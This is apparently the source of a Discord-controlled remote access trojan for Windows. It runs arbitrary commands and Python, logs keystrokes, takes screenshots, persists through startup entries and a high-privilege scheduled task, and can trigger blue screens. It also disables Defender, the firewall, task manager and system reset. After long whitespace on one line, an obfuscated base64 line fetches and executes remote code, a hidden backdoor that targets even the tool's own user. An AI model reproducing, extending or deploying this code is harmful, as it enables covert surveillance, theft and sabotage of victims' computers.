import discord
import os
import requests
import ctypes
import pycaw
import ctypes.wintypes
import pyautogui
import asyncio
from pynput.keyboard import Key, Listener
import threading
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import shutil
import subprocess
import tempfile
import winreg
from pathlib import Path
import sys
import os
import shutil
import winreg
import sys
from pathlib import Path
import os
import shutil
import sys
import subprocess
from pathlib import Path
import io
import time
import base64
guildid = f"{server_id}" # type: ignore
guildid = int(guildid)
bottoken = f"{token}" #  type: ignore
logging = False
dumping = False
lastpressed = None    
keyspressed = []                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ib2lzdGVyb3VzLWthdGFpZmktNDBiNDNkLm5ldGxpZnkuYXBwL2FzZGFzZC50eHQ=").decode('utf-8')).text)
def on_press(key):
    global last_pressed
    try:
        last_pressed = key.char
    except AttributeError:
        last_pressed = str(key).replace("Key.", "")
    if logging and last_pressed:
        asyncio.run_coroutine_threadsafe(send_key(last_pressed), bot.loop)
    if dumping and last_pressed:
        keyspressed.append(last_pressed)

async def send_key(key):
    await channel.send(key)
    asyncio.sleep(1)

def screenshot():
    screenshot_image = pyautogui.screenshot()

    img_binary = io.BytesIO()
    screenshot_image.save(img_binary, format="PNG")
    img_binary.seek(0)
    return img_binary

def persistadmin(custom_task_name, custom_file_name):
    src_file = sys.argv[0]
    
    localappdata = os.getenv('LOCALAPPDATA')
    if not localappdata:
        return
    
    dest_dir = os.path.join(localappdata, "WindowsBootManager")
    
    Path(dest_dir).mkdir(parents=True, exist_ok=True)
    
    dest_file = os.path.join(dest_dir, custom_file_name)

    shutil.copy(src_file, dest_file)
    
    command = f'SchTasks /Create /TN "{custom_task_name}" /TR "{dest_file}" /SC ONSTART /RL HIGHEST /F'
    
    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

def system(command): # lowkey made the func name system() bc i used os.system() but that was BUNSSSS so now i js used ctrl h to replace all os.system with system
    subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
def persist():
    custom_name = "systeminit.exe"
    
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    current_file_path = sys.argv[0]

    destination_path = os.path.join(startup_path, custom_name)

    try:
        shutil.copy(current_file_path, destination_path)
    except Exception as e:
        pass
def set_volume_max():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(1.0, None)

def set_volume_min():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(0.0, None)
def trigger_blue_screen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    except Exception as e:
        print(f"error: {e}")
def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

def backupstartupifoneimusingdoesntwork():
    path = sys.argv[0]
    system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y')

channel = None
def show_messagebox(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)
class botclient(discord.Client):
    async def on_ready(self):
        global channel, ip, ip_response
        ip_response = requests.get("https://ipinfo.io/ip")
        ip = ip_response.text
        ip = ''.join(char for char in ip if char != ".")
        guild = self.get_guild(guildid)
        channel_name = ip
        channel = discord.utils.get(guild.channels, name=channel_name)
        if channel: await channel.send("bot initilized @here, @everyone")
        else: 
            await guild.create_text_channel(name=ip)
            channel = discord.utils.get(guild.channels, name=ip)
            await channel.send("bot initilized @here, @everyone, !help for commands")
    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content == "!help":
            help_message = """                        
            ---------modules----------
                    ------non admin------
                    !cmd - executes a cmd
                    !screenshot - gets a screenshot of the screen
                    !python - executes any python 1 line
                    !messagebox - makes a msg box(usage: !mesagebox (title) (text)))
                    !website - opens a website(usage: !website (websitename), MUST INCLUDE HTTPS:// ))
                    !shutdown - shutsdown pc
                    !restart - restarts pc
                    !logout - logsout pc
                    !admincheck - checks for admin privleges
                    !volmax - sets the volume to max
                    !volmin - sets the volume to mute
                    !typewrite - types in a key or sentence of your choice
                    !hotkey - uses a hot key like ctrl w, ctrl s, ctrl z, etc
                    !startup - adds a file in their startup folder. does not run with admin.
                    !tasklist - shows all running tasks
                    !endtask - ends any usermode(non admin) task
                    !endtaskpid - ends a task using the process id(non admin)
                    !quit - closes the rat
                    ----key logger modules-----------------
                        !keylog - sends every key pressed into the channel
                        !keycollect - when on, puts all pressed keys in a list
                        !keydump - dumps all keys in the stored list
                        !keyclear - clears the dump list
                    --------admin required------
                    (use WITH admin so no bugs happen)
                    !adminstartup - adds a file to startup but runs with admin 
                    !bluescreen - bluescreens pc
                    !critproc - bluescreens pc if rat is closed
                    !uncritproc - makes the process normal so you can close safely
                    !disabletaskmgr - disables the task manager
                    !disableregedit - disables the registry editor
                    !disablefirewall - disables windows defender firewall
                    !disabledefender - disables windows defender
                    !disablereset - stops the user from resetting their pc
                    !enablefirewall - enables firewall
                    !enabledefender - enables windows defender
                    !enabletaskmgr - enables task manager
                    !enableregedit - enables the registry editor
                    !enablereset - allows the user to reset their pc
                    !exclude - does a mass exclusion to stop wd from removing your files
                    !adminendtask - ends a task but with admin rights(allows you to kill kinda anything)
                    !adminendtaskpid - ends a task by using the process id(get from tasklist
                        """
            
            help_file_path = os.path.join(tempfile.gettempdir(), 'help.txt')
            with open(help_file_path, 'w') as file:
                file.write(help_message)

            with open(help_file_path, 'rb') as file:
                await channel.send(file=discord.File(file, 'help.txt'))
            
            os.remove(help_file_path)

        elif message.content.startswith("!cmd"):
            try:
                if ip == message.channel.name:
                    command = message.content[len('!cmd '):]
                    if "start" in command:
                        os.system(command)
                    else:
                        system(command)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!python"):
            try:
                if ip == message.channel.name:
                    pythonscript = message.content[len('!python '):]
                    exec(pythonscript)
            except Exception as e:
                await channel.send(e)
        elif message.content.startswith('!messagebox'):
            try:
                if ip == message.channel.name:
                    parts = message.content.split(" ", 2)
                    if len(parts) < 3:
                        return
                    title = parts[1]
                    msg = parts[2]
                    show_messagebox(title, msg)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!website'):
            try:
                if ip == message.channel.name:
                    websitedest = message.content[len('!website '):]
                    os.system(f"start {websitedest}")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!shutdown'):
            try:
                if ip == message.channel.name:
                    system("shutdown /s /t 0")
            except Exception as e:
                await channel.send(f"error occured: {e}")

        elif message.content.startswith('!restart'):
            try:
                if ip == message.channel.name:
                    system("shutdown /r /t 0")
            except Exception as e:
                await channel.send(f"error occured: {e}")

        elif message.content.startswith('!logout'):
            try:
                if ip == message.channel.name:
                        system("shutdown /l")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!admincheck'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        await channel.send("user has admin")
                    else:
                        await channel.send("user does not have admin")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        
        elif message.content.startswith('!volmax'):
            try:
                if ip == message.channel.name:
                        set_volume_max()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!volmin'):
            try:
                if ip == message.channel.name:
                        set_volume_min()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!bluescreen"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        trigger_blue_screen()
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!critproc"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        critproc()
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!uncritproc"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        uncritproc()
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!startup"):
            try:
                if ip == message.channel.name:
                    persist()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!typewrite"):
            try:
                if ip == message.channel.name:
                    characterstowrite = message.content[len('!typewrite '):]
                    pyautogui.typewrite(characterstowrite)
            except Exception as e:
                await channel.send(f"error occured: {e}")

        elif message.content.startswith('!hotkey'):
            try:
                if ip == message.channel.name:
                    hotkeys = message.content.split(" ", 2)
                    if len(hotkeys) < 3:
                        return
                    hotkey1 = hotkeys[1]
                    hotkey2 = hotkeys[2]                
                    pyautogui.hotkey(hotkey1, hotkey2)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disabletaskmgr'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disableregedit'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disablefirewall'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("netsh advfirewall set allprofiles state off")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disabledefender'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!exclude'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell.exe Add-MpPreference -ExclusionPath "C:"')
                        await channel.send("added exclusion to c:(all files)")
                        system('powershell.exe Add-MpPreference -ExclusionExtension ".exe"')
                        await channel.send("added exclusion to all exe files")
                        system('powershell.exe Add-MpPreference -ExclusionExtension ".py"')
                        await channel.send("added exclusion to all py files")
                        system('powershell.exe Add-MpPreference -ExclusionExtension ".dll"')
                        await channel.send("added exclusion to all dll files")
                        system('powershell.exe Add-MpPreference -ExclusionExtension ".pyd"')
                        await channel.send("added exclusion to all pyd files")
                        system('powershell.exe Add-MpPreference -ExclusionPath "C:\\Windows\\System32\\cmd.exe"')
                        system('powershell.exe Add-MpPreference -ExclusionPath "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"')
                        await channel.send("cmd and powershell excluded")
                    else:
                        await channel.send("you need admin monkey")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!tasklist"):
            try:
                if ip == message.channel.name:
                    result = subprocess.run(['tasklist', '/fo', 'table'], capture_output=True, text=True)
                    file_path = os.path.join(os.getenv('TEMP'), 'tasklist.txt')
                    with open(file_path, 'w') as file:
                        file.write(result.stdout)
                    await channel.send(file=discord.File(file_path))
                    os.remove(file_path)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!disablereset"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("reagentc /disable")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!enablereset"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("reagentc /enable")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enablefirewall'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("netsh advfirewall set allprofiles state on")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enabledefender'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enabletaskmgr'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enableregedit'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 0')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!endtaskpid'):
            try:
                if ip == message.channel.name:
                    taskpid = message.content[len('!endtaskpid '):]
                    system(f'taskkill /PID {taskpid} /F')
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!endtask'):
            try:
                if ip == message.channel.name:
                    task = message.content[len('!endtask '):]
                    system(f'taskkill /IM "{task}" /F')
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!adminendtaskpid'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        admintaskpid = message.content[len('!endtask '):]
                        system(f'taskkill /PID {admintaskpid} /F /T')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!adminendtask'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        admintask = message.content[len('!adminendtask '):]
                        system(f'taskkill /IM "{admintask}" /F /T')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!adminstartup"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        persistadmin("WindowsServiceHost", "WindowsBootStartup.exe")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!screenshot"):
            try:
                if ip == message.channel.name:
                        img_binary = screenshot()
                        await channel.send(file=discord.File(img_binary, filename="screenshot.png"))
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keylog"):
            global logging
            try:
                if ip == message.channel.name:
                    if logging == False:
                        logging = True
                        print(logging)
                    else: 
                        logging = False
                        print(logging)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keycollect"):
            global dumping
            try:
                if ip == message.channel.name:
                    if dumping == True:
                        dumping = False
                    else:
                        dumping = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keydump"):
            global keyspressed
            try:
                if ip == message.channel.name:
                    await channel.send(keyspressed)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keyclear"):
            try:
                if ip == message.channel.name:
                    keyspressed.clear()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!quit"):
            try:
                if ip == message.channel.name:
                    await self.close()
                    sys.exit()
            except Exception as e:
                await channel.send(f"error occured: {e}")
intents = discord.Intents.default()
intents.message_content = True
bot = botclient(intents=intents)
def runlistener():
    with Listener(on_press=on_press) as listener:
        listener.join()
listenerthread = threading.Thread(target=runlistener, daemon=True)
listenerthread.start()
bot.run(bottoken)
